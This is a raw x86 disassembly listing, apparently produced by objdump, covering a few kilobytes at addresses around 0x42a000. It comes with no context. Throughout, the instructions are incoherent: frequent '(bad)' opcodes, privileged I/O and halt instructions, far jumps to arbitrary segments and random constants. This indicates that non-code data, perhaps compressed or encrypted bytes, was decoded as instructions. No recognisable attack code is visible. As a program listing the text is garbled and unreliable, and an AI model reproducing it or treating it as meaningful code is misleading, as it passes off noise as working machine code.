  42a08a:	sub    bh,dl
  42a08c:	mov    ebp,0xe5d24ef
	...
  42a0f1:	add    BYTE PTR [eax],al
  42a0f3:	add    bh,dl
  42a0f5:	pushf  
  42a0f6:	shr    BYTE PTR [ebp-0x1000235],0xdb
  42a0fd:	call   FWORD PTR [ebx]
  42a0ff:	(bad)  
  42a100:	push   cs
  42a101:	push   edi
  42a102:	xor    DWORD PTR [ecx],eax
  42a104:	js     0x42a0c8
  42a106:	add    DWORD PTR [eax],eax
  42a108:	add    eax,0xde000001
  42a10d:	bound  ebx,QWORD PTR [ebx-0x44]
  42a110:	dec    edi
  42a111:	mov    DWORD PTR [ebp+0x7601948c],ecx
  42a117:	arpl   WORD PTR [edi+ebp*1+0x63],bp
  42a11b:	cmp    ah,cl
  42a11d:	xor    BYTE PTR [ebx],dh
  42a11f:	popf   
  42a120:	fnstsw WORD PTR [eax]
  42a122:	push   ebx
  42a123:	les    ebp,FWORD PTR [edx*1+0x49140e0d]
  42a12a:	iret   
  42a12b:	lods   al,BYTE PTR ds:[esi]
  42a12c:	and    esi,esi
  42a12e:	inc    edx
  42a12f:	outs   dx,BYTE PTR ds:[esi]
  42a130:	sbb    DWORD PTR [eax+0x3f],eax
  42a133:	xchg   ebp,eax
  42a134:	cmc    
  42a135:	pop    ecx
  42a136:	loopne 0x42a0fa
  42a138:	iret   
  42a139:	mov    dh,0x3a
  42a13b:	pop    eax
  42a13c:	call   0xe67e:0x5992074e
  42a143:	icebp  
  42a144:	xor    edx,esi
  42a146:	test   eax,eax
  42a148:	ds call 0xf4c4b5dc
  42a14e:	inc    ebp
  42a14f:	adc    ebp,DWORD PTR [edi]
  42a151:	jg     0x42a17c
  42a153:	cli    
  42a154:	cmp    DWORD PTR [ecx+esi*1+0x5d],edi
  42a158:	cld    
  42a159:	or     ebx,DWORD PTR [eax+0x1f2fda2e]
  42a15f:	fwait
  42a160:	push   cs
  42a161:	xor    eax,0xafd01721
  42a166:	test   DWORD PTR [esi+0x422a0c55],0x43ff3b79
  42a170:	add    al,0xaf
  42a172:	sbb    al,0x87
  42a174:	fdivr  QWORD PTR [esi+ecx*4]
  42a177:	hlt    
  42a178:	adc    eax,ebp
  42a17a:	mov    esi,0x1c44ec0
  42a17f:	sbb    eax,0x9b04b186
  42a184:	or     BYTE PTR [ecx-0x45],al
  42a187:	sbb    BYTE PTR [edx+0x7],bl
  42a18a:	or     eax,0xe0215c49
  42a18f:	(bad)  
  42a190:	xchg   DWORD PTR [eax+esi*8+0x39dce377],edi
  42a197:	push   cs
  42a198:	lods   eax,DWORD PTR ds:[esi]
  42a199:	gs sbb eax,0x4d9694a6
  42a19f:	xor    BYTE PTR [edx-0x6d3e9662],ch
  42a1a5:	and    esi,DWORD PTR [ecx-0x66]
  42a1a8:	nop
  42a1a9:	and    DWORD PTR [eax-0x40],ecx
  42a1ac:	push   cs
  42a1ad:	xor    cl,ch
  42a1af:	sti    
  42a1b0:	(bad)  [edx-0x44]
  42a1b3:	pop    es
  42a1b4:	adc    ch,BYTE PTR [ebp-0xd]
  42a1b7:	jg     0x42a16e
  42a1b9:	jmp    0x42a217
  42a1bb:	jno    0x42a215
  42a1bd:	out    0x81,al
  42a1bf:	loop   0x42a143
  42a1c1:	sub    DWORD PTR [eax],eax
  42a1c3:	imul   ebp,DWORD PTR [edi+0x9],0x23
  42a1c7:	cmp    esi,DWORD PTR [eax]
  42a1c9:	fisttp WORD PTR fs:[edx+edi*8+0x7b3aa324]
  42a1d1:	(bad)  
  42a1d2:	test   eax,0x96775492
  42a1d7:	cli    
  42a1d8:	inc    ebx
  42a1d9:	jmp    0xba15:0xaaa3ee81
  42a1e0:	xor    eax,0x3453cffc
  42a1e5:	call   0xb6f3debe
  42a1ea:	mov    cl,0x9c
  42a1ec:	pop    es
  42a1ed:	jmp    0x1ba2:0x19fcae36
  42a1f4:	and    bh,BYTE PTR [eax-0x4f]
  42a1f7:	push   ds
  42a1f8:	cld    
  42a1f9:	in     al,dx
  42a1fa:	pop    esp
  42a1fb:	(bad)  
  42a1fc:	jae    0x42a1b0
  42a1fe:	xlat   BYTE PTR ds:[ebx]
  42a1ff:	sbb    al,0x6d
  42a201:	sti    
  42a202:	hlt    
  42a203:	lea    eax,[eax]
  42a205:	pop    ecx
  42a206:	add    ecx,edx
  42a208:	mov    al,0x64
  42a20a:	sbb    esp,DWORD PTR [ebp-0x584327b7]
  42a210:	out    0x0,al
	...
  42a272:	add    BYTE PTR [eax],al
  42a274:	sub    eax,DWORD PTR [ebp+0x19bf1995]
  42a27a:	scas   eax,DWORD PTR es:[edi]
  42a27b:	mov    bh,0x1a
  42a27d:	aas    
  42a27e:	scas   al,BYTE PTR es:[edi]
  42a27f:	fldcw  WORD PTR [ecx+0x7dd3e07d]
  42a285:	ret    
  42a286:	add    DWORD PTR [eax],eax
  42a288:	add    eax,0x11000001
  42a28d:	inc    edi
  42a28e:	jmp    0x42a2e8
  42a290:	adc    esi,DWORD PTR [eax+0x682c1ce7]
  42a296:	mov    al,ds:0x6a92070a
  42a29b:	pop    ecx
  42a29c:	and    eax,0x16794db9
  42a2a1:	jl     0x42a26d
  42a2a3:	loope  0x42a28d
  42a2a5:	call   DWORD PTR [edi+0x7]
  42a2a8:	pushf  
  42a2a9:	and    al,0x3f
  42a2ab:	and    al,0x12
  42a2ad:	scas   al,BYTE PTR es:[edi]
  42a2ae:	arpl   WORD PTR [edx],di
  42a2b0:	ret    
  42a2b1:	jne    0x42a2c8
  42a2b3:	js     0x42a2fa
  42a2b5:	(bad)  
  42a2b6:	push   esp
  42a2b7:	shl    BYTE PTR [esi-0x7b],1
  42a2ba:	imul   ebp,DWORD PTR [esi+0x76],0xb1a74eb3
  42a2c1:	mov    ah,0xf1
  42a2c3:	push   ds
  42a2c4:	ret    
  42a2c5:	repnz imul esi,DWORD PTR [ecx+0x61],0xf48af522
  42a2cd:	jns    0x42a310
  42a2cf:	lea    edi,[edx]
  42a2d1:	in     al,dx
  42a2d2:	jp     0x42a327
  42a2d4:	push   edi
  42a2d5:	xchg   ebx,eax
  42a2d6:	mov    ch,0x62
  42a2d8:	dec    esp
  42a2d9:	xor    BYTE PTR [esi+0x6c],dl
  42a2dc:	jbe    0x42a35c
  42a2de:	call   ebp
  42a2e0:	in     al,dx
  42a2e1:	lods   al,BYTE PTR ds:[esi]
  42a2e2:	imul   esi,DWORD PTR [ecx],0xe8e372d9
  42a2e8:	int3   
  42a2e9:	mov    ds:0xa9913c9e,al
  42a2ee:	xchg   esi,ecx
  42a2f0:	sar    BYTE PTR [edx+ebp*4+0x41948d98],1
  42a2f7:	retf   
  42a2f8:	aaa    
  42a2f9:	mov    di,0x20ea
  42a2fd:	jo     0x42a2c9
  42a2ff:	jle    0x42a2e8
  42a301:	xchg   ebp,eax
  42a302:	js     0x42a286
  42a304:	leave  
  42a305:	fcmovnbe st,st(4)
  42a307:	gs pop ebx
  42a309:	mov    ah,0xb3
  42a30b:	rcl    BYTE PTR [ebx+0x1a],cl
  42a30e:	jp     0x42a2bf
  42a310:	ret    0xa693
  42a313:	adc    DWORD PTR [ebp-0x7a],edx
  42a316:	sub    al,0x2e
  42a318:	adc    BYTE PTR [ecx+0x4],cl
  42a31b:	popa   
  42a31c:	jmp    0x29788556
  42a321:	push   eax
  42a322:	mov    ah,cl
  42a324:	stos   DWORD PTR es:[edi],eax
  42a325:	out    dx,al
  42a326:	pop    esi
  42a327:	aam    0x93
  42a329:	loopne 0x42a2ea
  42a32b:	into   
  42a32c:	add    bl,BYTE PTR [edi]
  42a32e:	xor    esi,DWORD PTR [edi]
  42a330:	cli    
  42a331:	ins    DWORD PTR es:[edi],dx
  42a332:	les    esi,FWORD PTR es:[ecx+0x784080ba]
  42a339:	(bad)  
  42a33a:	repz jmp 0x1395bf42
  42a340:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a341:	aam    0xdd
  42a343:	scas   eax,DWORD PTR es:[edi]
  42a344:	pop    eax
  42a345:	lods   al,BYTE PTR ds:[esi]
  42a346:	or     BYTE PTR [ebx+0x3f78f3df],dl
  42a34c:	in     eax,0x51
  42a34e:	cs rol bh,0xc5
  42a352:	xchg   DWORD PTR [edi],ebx
  42a354:	jbe    0x42a33d
  42a356:	daa    
  42a357:	xchg   ebx,eax
  42a358:	fwait
  42a359:	mov    dh,0x26
  42a35b:	(bad)  
  42a35d:	mov    al,ds:0x8b627e6c
  42a362:	cmc    
  42a363:	inc    ecx
  42a364:	outs   dx,DWORD PTR ds:[esi]
  42a365:	mov    eax,eax
  42a367:	ins    BYTE PTR es:[edi],dx
  42a368:	lahf   
  42a369:	adc    BYTE PTR [esi],0x87
  42a36c:	jmp    0x42a375
  42a36e:	dec    esi
  42a36f:	or     ecx,DWORD PTR [ebp+0x40]
  42a372:	mov    bl,0xe
  42a374:	add    BYTE PTR [esi+0x48],dh
  42a377:	test   BYTE PTR [edi],dh
  42a379:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a37a:	jl     0x42a366
  42a37c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a37d:	test   al,0x7b
  42a37f:	push   cs
  42a380:	fcmovne st,st(3)
  42a382:	mov    al,ds:0x814c2d20
  42a387:	fisubr WORD PTR [ebx-0x2b]
  42a38a:	test   al,0xd2
  42a38c:	lods   al,BYTE PTR ds:[esi]
  42a38d:	mov    BYTE PTR [ebp-0x5],dl
  42a390:	sub    eax,DWORD PTR [eax]
	...
  42a3f2:	add    BYTE PTR [eax],al
  42a3f4:	jg     0x42a404
  42a3f6:	jne    0x42a433
  42a3f8:	jne    0x42a475
  42a3fa:	jg     0x42a44a
  42a3fc:	loop   0x42a467
  42a3fe:	mov    ebp,0x69d9fd3d
  42a403:	leave  
  42a404:	add    ah,0x1
  42a407:	add    BYTE PTR ds:0xd3000001,al
  42a40d:	sub    eax,0xa42c8c2
  42a412:	jb     0x42a476
  42a414:	out    0xc1,al
  42a416:	mov    al,0x6
  42a418:	adc    BYTE PTR [esi+0x29f80549],cl
  42a41e:	scas   al,BYTE PTR es:[edi]
  42a41f:	daa    
  42a420:	imul   esp,DWORD PTR cs:[eax-0x59],0x4b
  42a425:	call   0x2be1:0x679b8cee
  42a42c:	nop
  42a42d:	xor    esp,DWORD PTR [edi-0x49]
  42a430:	jnp    0x42a402
  42a432:	and    ebx,DWORD PTR [eax-0x42a86489]
  42a438:	xor    DWORD PTR [ebx],edx
  42a43a:	mov    ebx,DWORD PTR [ebp-0x4d]
  42a43d:	mov    al,0x7c
  42a43f:	xchg   esp,eax
  42a440:	lds    eax,FWORD PTR [eax-0x72]
  42a443:	ret    
  42a444:	xor    eax,0x215808db
  42a449:	std    
  42a44a:	pop    ss
  42a44b:	adc    edi,DWORD PTR [esi]
  42a44d:	ins    BYTE PTR es:[edi],dx
  42a44e:	adc    eax,0x52ce25f7
  42a453:	lods   eax,DWORD PTR ds:[esi]
  42a454:	mov    cl,cl
  42a456:	cld    
  42a457:	lahf   
  42a458:	dec    eax
  42a459:	xchg   ebx,eax
  42a45a:	(bad)  
  42a45b:	adc    ebp,eax
  42a45d:	xchg   ebx,eax
  42a45e:	fmulp  st(5),st
  42a460:	leave  
  42a461:	imul   ecx,DWORD PTR [eax-0x45],0x60
  42a465:	jae    0x42a40b
  42a467:	int    0xfa
  42a469:	push   esi
  42a46a:	xchg   ebx,eax
  42a46b:	cmp    BYTE PTR [esi],bh
  42a46d:	loopne 0x42a41f
  42a46f:	jmp    0x8ca3e7a2
  42a474:	fidivr DWORD PTR [ebx-0x4d68e459]
  42a47a:	iret   
  42a47b:	(bad)  
  42a47c:	call   0x4cd29882
  42a481:	or     al,0x4e
  42a483:	cmp    DWORD PTR [eax+0x45],esp
  42a486:	xor    esi,DWORD PTR [ebx+0x30]
  42a489:	gs pusha 
  42a48b:	cli    
  42a48c:	add    al,0x33
  42a48e:	lds    ebp,FWORD PTR [edx-0x50964a18]
  42a494:	sbb    al,0xfc
  42a496:	test   ebx,0xabb1aacd
  42a49c:	jo     0x42a452
  42a49e:	jmp    0x42a4d7
  42a4a0:	out    0xf6,al
  42a4a2:	or     eax,0xe47296e9
  42a4a7:	mov    cl,0x48
  42a4a9:	lock adc eax,0x24915ac0
  42a4af:	retf   0x8685
  42a4b2:	or     eax,DWORD PTR ds:0x597e1d7a
  42a4b8:	xchg   ebp,eax
  42a4b9:	popf   
  42a4ba:	jmp    0xf6956b14
  42a4bf:	cld    
  42a4c0:	xchg   BYTE PTR [ecx+eiz*4+0x2c],cl
  42a4c4:	dec    ebp
  42a4c5:	jne    0x42a4ba
  42a4c7:	addr16 lahf 
  42a4c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a4ca:	adc    DWORD PTR [ecx+eiz*2],ebx
  42a4cd:	fisub  DWORD PTR [eax-0x3f]
  42a4d0:	mov    ecx,0x993b2464
  42a4d5:	jmp    0x42a498
  42a4d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a4d8:	mov    eax,ds:0x6221882f
  42a4dd:	fst    DWORD PTR [eax-0x3f]
  42a4e0:	or     dh,BYTE PTR [edx]
  42a4e2:	inc    ebx
  42a4e3:	xchg   ebx,eax
  42a4e4:	stos   DWORD PTR es:[edi],eax
  42a4e5:	fimul  DWORD PTR [edi+0x28b47878]
  42a4eb:	sub    eax,0xdc238ca7
  42a4f1:	jno    0x42a56b
  42a4f3:	aad    0xc5
  42a4f5:	mov    DWORD PTR [eax],eax
  42a4f7:	adc    eax,DWORD PTR [edi-0x7ede381e]
  42a4fd:	ja     0x42a50a
  42a4ff:	sub    eax,0x6b3f88b7
  42a504:	out    dx,al
  42a505:	jno    0x42a543
  42a507:	stos   DWORD PTR es:[edi],eax
  42a508:	mov    al,ds:0xc5b220c4
  42a50d:	neg    DWORD PTR [eax+0x4617]
	...
  42a573:	add    BYTE PTR [eax],bl
  42a575:	dec    edi
  42a576:	pop    ss
  42a577:	mov    ecx,0xefbef957
  42a57c:	(bad)  
  42a57d:	cmc    
  42a57e:	mov    edx,0xd9e1929f
  42a583:	call   0x446b0f
  42a588:	add    eax,0x78000001
  42a58d:	cdq    
  42a58e:	(bad)  
  42a58f:	adc    DWORD PTR [edi+edx*8],ebx
  42a592:	sub    DWORD PTR [ecx+edi*4+0x4178f63d],edx
  42a599:	add    BYTE PTR [eax+esi*1],dl
  42a59c:	in     al,dx
  42a59d:	ss fwait
  42a59f:	sub    al,0x77
  42a5a1:	aam    0x5f
  42a5a3:	xor    esp,DWORD PTR [ecx+eax*2-0x75f479ac]
  42a5aa:	pop    ebp
  42a5ab:	popf   
  42a5ac:	mov    ebp,0x89879eff
  42a5b1:	sub    BYTE PTR [edi+0x12],0xe5
  42a5b5:	scas   al,BYTE PTR es:[edi]
  42a5b6:	inc    edx
  42a5b7:	ins    BYTE PTR es:[edi],dx
  42a5b8:	inc    DWORD PTR [ecx-0x744d7bd7]
  42a5be:	mov    edx,0x5ebec503
  42a5c3:	fcmovb st,st(6)
  42a5c5:	sub    edx,edx
  42a5c7:	dec    edx
  42a5c8:	dec    eax
  42a5c9:	rcl    dl,cl
  42a5cb:	retf   
  42a5cc:	xor    DWORD PTR [esi+0x2f91d5fc],ebp
  42a5d2:	mov    dh,0xc4
  42a5d4:	dec    edx
  42a5d5:	cmc    
  42a5d6:	rcl    BYTE PTR [ecx+0x165d3d8b],0x28
  42a5dd:	sbb    eax,0x52db685c
  42a5e2:	sbb    BYTE PTR [edx-0x475d85c],0x25
  42a5e9:	pop    ebx
  42a5ea:	(bad)  
  42a5eb:	fld    QWORD PTR [esp]
  42a5ee:	mov    WORD PTR [esi+0x2d],ds
  42a5f1:	shr    DWORD PTR [esp+ecx*1],0xb9
  42a5f5:	(bad)  
  42a5f6:	fstp   QWORD PTR [eax+0x51]
  42a5f9:	jge    0x42a66c
  42a5fb:	bound  ecx,QWORD PTR [ebp-0x1f]
  42a5fe:	ja     0x42a5f8
  42a600:	sub    al,0xd3
  42a602:	and    eax,0xde244f06
  42a607:	cmp    BYTE PTR [ecx],ch
  42a609:	mov    edx,0xd40d4305
  42a60e:	adc    BYTE PTR [edi-0x18e54121],ch
  42a614:	in     eax,0x4d
  42a616:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  42a618:	mov    ds:0xca612836,al
  42a61d:	cwde   
  42a61e:	sub    DWORD PTR [ebx+ebp*4+0x41],0x10ac0e72
  42a626:	pop    DWORD PTR [edi]
  42a628:	outs   dx,DWORD PTR ds:[esi]
  42a629:	cmp    dh,BYTE PTR [esi-0x3f]
  42a62c:	xchg   ebx,edi
  42a62e:	push   ebx
  42a62f:	imul   edi,DWORD PTR [eax],0x30
  42a632:	dec    ebp
  42a633:	(bad)  
  42a634:	mov    edi,DWORD PTR [ebx]
  42a636:	xchg   DWORD PTR [edi+0x16f17462],eax
  42a63c:	mov    ah,0x91
  42a63e:	jae    0x42a634
  42a640:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a641:	aam    0xdd
  42a643:	cmp    BYTE PTR ss:[ebp-0x35],cl
  42a647:	addr16 jae 0x42a660
  42a64a:	cmp    DWORD PTR [edi-0x2e9fe22a],eax
  42a650:	sbb    ebp,DWORD PTR cs:[eax+edi*4]
  42a654:	pushf  
  42a655:	cmp    esi,0xffffffae
  42a658:	aad    0x6d
  42a65a:	pop    es
  42a65b:	(bad)  
  42a65c:	call   0x6839:0xaa614454
  42a663:	mov    eax,ds:0x49a62999
  42a668:	xor    BYTE PTR ds:0xf61985da,al
  42a66e:	gs ss add eax,0x7ccde4ff
  42a675:	pop    ebx
  42a676:	mov    ecx,fs
  42a678:	out    dx,al
  42a679:	icebp  
  42a67a:	or     ebx,DWORD PTR [edx+0x6]
  42a67d:	test   BYTE PTR ds:0x419509c7,0x68
  42a684:	adc    edi,DWORD PTR [ebx-0x65]
  42a687:	inc    esp
  42a688:	jbe    0x42a700
  42a68a:	daa    
  42a68b:	inc    esi
  42a68c:	ret    
  42a68d:	xor    DWORD PTR [ebp+0x85d],ebx
	...
  42a6f3:	add    BYTE PTR [esi+edx*1],ah
  42a6f6:	outs   dx,BYTE PTR ds:[esi]
  42a6f7:	(bad)  
  42a6f8:	jle    0x42a6f9
  42a6fa:	lods   eax,DWORD PTR ds:[esi]
  42a6fb:	test   DWORD PTR [edi-0x5547ece4],0x8ce296df
  42a705:	mov    BYTE PTR [ecx],0x0
  42a708:	add    eax,0xba000001
  42a70d:	je     0x42a6f6
  42a70f:	pop    ss
  42a710:	out    dx,eax
  42a711:	stc    
  42a712:	dec    ebp
  42a713:	pop    ds
  42a714:	dec    ecx
  42a715:	adc    al,0x1c
  42a717:	sub    al,0xd7
  42a719:	jmp    FWORD PTR [edi+ecx*2-0x2c958930]
  42a720:	xchg   ebp,eax
  42a721:	lods   eax,DWORD PTR ds:[esi]
  42a722:	fstp   QWORD PTR [ecx+0x2fe23026]
  42a728:	xchg   esi,eax
  42a729:	ins    DWORD PTR es:[edi],dx
  42a72a:	jp     0x42a795
  42a72c:	int3   
  42a72d:	out    dx,eax
  42a72e:	jb     0x42a6e0
  42a730:	mov    BYTE PTR [edi+0x52],ah
  42a733:	ret    
  42a734:	inc    ebx
  42a735:	xor    bh,al
  42a737:	inc    ebp
  42a738:	loop   0x42a7a1
  42a73a:	retf   0x9d9e
  42a73d:	scas   eax,DWORD PTR es:[edi]
  42a73e:	mov    dh,0xce
  42a740:	inc    eax
  42a741:	ret    0xad2e
  42a744:	nop
  42a745:	and    DWORD PTR [edx],edx
  42a747:	xchg   BYTE PTR [edx+ebp*8],bl
  42a74a:	out    0x4b,al
  42a74c:	lods   al,BYTE PTR ds:[esi]
  42a74d:	gs out dx,al
  42a74f:	xchg   edx,eax
  42a750:	retf   0xecad
  42a753:	dec    edi
  42a754:	stc    
  42a755:	mov    ah,0xb2
  42a757:	pop    esp
  42a758:	or     al,0x96
  42a75a:	cmp    eax,0x36507c99
  42a75f:	stos   BYTE PTR es:[edi],al
  42a760:	data16 (bad) 
  42a762:	fcomp  QWORD PTR [eax+0x76]
  42a765:	retf   
  42a766:	dec    edx
  42a767:	adc    cl,ch
  42a769:	and    dl,bh
  42a76b:	jp     0x42a74f
  42a76d:	dec    edi
  42a76e:	push   esp
  42a76f:	jae    0x42a761
  42a771:	jne    0x42a725
  42a773:	inc    esp
  42a774:	outs   dx,BYTE PTR ds:[esi]
  42a775:	test   edi,ebx
  42a777:	inc    ecx
  42a778:	fs push es
  42a77a:	jno    0x42a7f3
  42a77c:	jae    0x42a7c2
  42a77e:	(bad)  
  42a77f:	xor    eax,0x55dc2339
  42a784:	mov    dh,0x50
  42a786:	int    0xc
  42a788:	mov    dh,bl
  42a78a:	fucomp st(1)
  42a78c:	jl     0x42a809
  42a78e:	sbb    eax,0xc6befaf4
  42a793:	or     al,0xde
  42a795:	xchg   ebp,eax
  42a796:	cmp    al,0x24
  42a798:	or     bl,dh
  42a79a:	(bad)  [edx+0x32]
  42a79d:	pop    ebx
  42a79e:	inc    esi
  42a79f:	mov    ch,BYTE PTR [ecx-0xc89f7f8]
  42a7a5:	lea    ecx,[ebx]
  42a7a7:	mov    al,0xd6
  42a7a9:	adc    al,0x38
  42a7ab:	in     al,dx
  42a7ac:	aad    0x19
  42a7ae:	mov    edi,0xd0187d6f
  42a7b3:	mov    ecx,ecx
  42a7b5:	loope  0x42a754
  42a7b7:	mov    bl,0xe2
  42a7b9:	mov    cs,WORD PTR [ecx]
  42a7bb:	dec    edi
  42a7bc:	ror    DWORD PTR [edx-0x5b],1
  42a7bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a7c0:	sbb    DWORD PTR [esi-0x35949197],0x385b56b5
  42a7ca:	hlt    
  42a7cb:	mov    ebp,0x2d300835
  42a7d0:	jo     0x42a80c
  42a7d2:	test   BYTE PTR [ecx-0x62f8dd21],dl
  42a7d8:	and    esp,DWORD PTR [edx-0x3c9e7542]
  42a7de:	int3   
  42a7df:	fwait
  42a7e0:	dec    ebx
  42a7e1:	inc    eax
  42a7e2:	push   esi
  42a7e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a7e4:	sbb    BYTE PTR [ebx+0x7e],dl
  42a7e7:	mov    BYTE PTR [ebp-0x26b415ae],dl
  42a7ed:	cmc    
  42a7ee:	mov    ecx,0xbabf8909
  42a7f3:	ins    BYTE PTR es:[edi],dx
  42a7f4:	adc    eax,0x2be19db4
  42a7f9:	fs xchg esi,eax
  42a7fb:	pusha  
  42a7fc:	mov    cl,0x6b
  42a7fe:	aad    0x13
  42a800:	jmp    0x61217231
  42a805:	cwde   
  42a806:	jne    0x42a7e7
  42a808:	ins    BYTE PTR es:[edi],dx
  42a809:	mov    BYTE PTR [esi],cl
  42a80b:	test   eax,0x54938ae3
  42a810:	sub    BYTE PTR [eax],al
	...
  42a872:	add    BYTE PTR [eax],al
  42a874:	mov    ah,BYTE PTR [ebp+0x63]
  42a877:	mov    edi,0x75debfef
  42a87c:	add    ebp,0x4eef6c97
  42a882:	out    0xa2,eax
  42a884:	xchg   ecx,eax
  42a885:	mov    DWORD PTR [ecx],0x10500
  42a88b:	add    BYTE PTR [eax+0x55],dh
  42a88e:	sub    bh,BYTE PTR [esi-0x71941090]
  42a894:	mov    dl,0x81
  42a896:	or     BYTE PTR [edi],bl
  42a898:	int3   
  42a899:	xchg   ebp,eax
  42a89a:	pop    ss
  42a89b:	and    BYTE PTR [ebp+eiz*8-0x6c],dl
  42a89f:	or     dh,BYTE PTR [eax+0x114ae467]
  42a8a5:	test   BYTE PTR [ecx-0x3b],cl
  42a8a8:	inc    ebp
  42a8a9:	sbb    esp,edi
  42a8ab:	xor    eax,DWORD PTR [ecx+0x7a945a1]
  42a8b1:	retf   
  42a8b2:	or     al,0x21
  42a8b4:	ss inc ebp
  42a8b6:	lods   eax,DWORD PTR ds:[esi]
  42a8b7:	add    BYTE PTR [esi+0x5c27108d],bh
  42a8bd:	test   DWORD PTR [ebx],ebx
  42a8bf:	xchg   DWORD PTR [esi+0x4f],ebx
  42a8c2:	outs   dx,DWORD PTR ds:[esi]
  42a8c3:	retf   0x4a9d
  42a8c6:	mov    esp,ecx
  42a8c8:	mov    edi,0x73b1843a
  42a8cd:	test   DWORD PTR [edi],edx
  42a8cf:	dec    esp
  42a8d0:	or     eax,0xa5faa905
  42a8d5:	lahf   
  42a8d6:	inc    ebp
  42a8d7:	stc    
  42a8d8:	div    DWORD PTR [ebp+0x26]
  42a8db:	pop    esi
  42a8dc:	dec    ecx
  42a8dd:	add    DWORD PTR [ebx+ebx*4+0x45ef8787],ebx
  42a8e4:	xchg   esp,eax
  42a8e5:	dec    eax
  42a8e6:	mov    esp,0xd09e8e2c
  42a8eb:	int3   
  42a8ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a8ed:	xorps  xmm3,XMMWORD PTR [esi+0x21faf89]
  42a8f4:	push   edi
  42a8f5:	mov    ebx,0x7a8ae0fd
  42a8fa:	jg     0x42a974
  42a8fc:	mov    eax,ds:0x2ccfe87
  42a901:	adc    al,dh
  42a903:	cwde   
  42a904:	icebp  
  42a905:	sub    ch,al
  42a907:	cmp    al,0xa8
  42a909:	jmp    0xbdee:0xf1ffb70b
  42a910:	jnp    0x42a990
  42a912:	repz enter 0x7949,0xf1
  42a917:	(bad)  
  42a918:	into   
  42a919:	mov    DWORD PTR [ebx-0x3e],ebp
  42a91c:	cld    
  42a91d:	jbe    0x42a982
  42a91f:	xor    BYTE PTR ds:0x93a2b9fa,0x12
  42a926:	xor    al,0xc9
  42a928:	push   ebx
  42a929:	retf   
  42a92a:	test   al,0x39
  42a92c:	pushf  
  42a92d:	sahf   
  42a92e:	iret   
  42a92f:	sub    eax,0xbf19ab25
  42a934:	outs   dx,DWORD PTR ds:[esi]
  42a935:	sub    DWORD PTR [edx-0x4ac2a415],esi
  42a93b:	mov    ebx,0xa81c0a20
  42a940:	adc    ecx,DWORD PTR [edi-0x148c07ef]
  42a946:	mov    ds:0x23090200,eax
  42a94b:	pop    es
  42a94c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a94d:	stos   DWORD PTR es:[edi],eax
  42a94e:	lgs    eax,FWORD PTR [edi+ebp*4]
  42a952:	lds    eax,FWORD PTR [ebx+0x439dd208]
  42a958:	pop    eax
  42a959:	stos   BYTE PTR es:[edi],al
  42a95a:	call   0x6f5b3e14
  42a95f:	ss jne 0x42a95a
  42a962:	bound  esp,QWORD PTR [edx+0x73]
  42a965:	cmc    
  42a966:	lahf   
  42a967:	imul   esi,DWORD PTR ds:0x2c3aab67,0x5aaaf5f2
  42a971:	fs popa 
  42a973:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a974:	retf   0xe70
  42a977:	ins    DWORD PTR es:[edi],dx
  42a978:	jl     0x42a975
  42a97a:	push   ebp
  42a97b:	push   ss
  42a97c:	out    dx,eax
  42a97d:	add    ecx,DWORD PTR [edi-0x7d]
  42a980:	(bad)  [ebp-0x7d]
  42a983:	lods   al,BYTE PTR gs:[esi]
  42a985:	cmp    al,0x90
  42a987:	lea    ebx,[ebp-0x4c]
  42a98a:	sbb    eax,0xd64c3923
  42a98f:	push   eax
  42a990:	add    al,BYTE PTR [eax]
	...
  42a9f2:	add    BYTE PTR [eax],al
  42a9f4:	test   al,0x93
  42a9f6:	sbb    eax,0xfbee3fee
  42a9fb:	xlat   BYTE PTR ds:[ebx]
  42a9fc:	in     eax,0xd3
  42a9fe:	aad    0x7
  42aa00:	scas   eax,DWORD PTR es:[edi]
  42aa01:	inc    ecx
  42aa02:	dec    ecx
  42aa03:	pop    eax
  42aa04:	xchg   esi,eax
  42aa05:	enter  0x1,0x5
  42aa09:	add    DWORD PTR [eax],eax
  42aa0b:	add    BYTE PTR [esi+0x14],cl
  42aa0e:	call   0x3411:0x7b8b1a33
  42aa15:	in     eax,dx
  42aa16:	push   ds
  42aa17:	mov    dh,0x2a
  42aa19:	ret    0x7f64
  42aa1c:	mov    edi,DWORD PTR [ebx-0x7e]
  42aa1f:	add    BYTE PTR [edx],bl
  42aa21:	aaa    
  42aa22:	retf   
  42aa23:	sbb    DWORD PTR [ebx],0x30
  42aa26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42aa27:	lods   al,BYTE PTR ds:[esi]
  42aa28:	enter  0x96f5,0x73
  42aa2c:	mov    cl,0xc8
  42aa2e:	xchg   dh,bl
  42aa30:	push   eax
  42aa31:	(bad)  
  42aa32:	mov    edx,0x5c7fbe77
  42aa37:	xor    eax,0x729087a2
  42aa3c:	cmp    ch,BYTE PTR [eax]
  42aa3e:	push   ebp
  42aa3f:	enter  0x2196,0x47
  42aa43:	and    BYTE PTR [ebx-0x10215802],bl
  42aa49:	mov    ss,WORD PTR [edx-0x6f547df8]
  42aa4f:	pop    eax
  42aa50:	cmp    BYTE PTR [edi-0x25fdbee1],dl
  42aa56:	bound  edx,QWORD PTR [edi+0x43]
  42aa59:	mov    ds:0x71d611b8,eax
  42aa5e:	push   0x34f45f2
  42aa63:	inc    edx
  42aa64:	dec    esp
  42aa65:	loop   0x42aa40
  42aa67:	mov    cl,0xb0
  42aa69:	xchg   ebp,eax
  42aa6a:	jae    0x42aa37
  42aa6c:	pop    ds
  42aa6d:	dec    ecx
  42aa6e:	je     0x42a9fc
  42aa70:	dec    esi
  42aa71:	enter  0xb778,0xb
  42aa75:	cmp    esi,edx
  42aa77:	mov    al,ds:0x86eaa5f6
  42aa7c:	pop    ds
  42aa7d:	mov    BYTE PTR [ebx-0x62],cl
  42aa80:	pop    edi
  42aa81:	mov    dh,0xf3
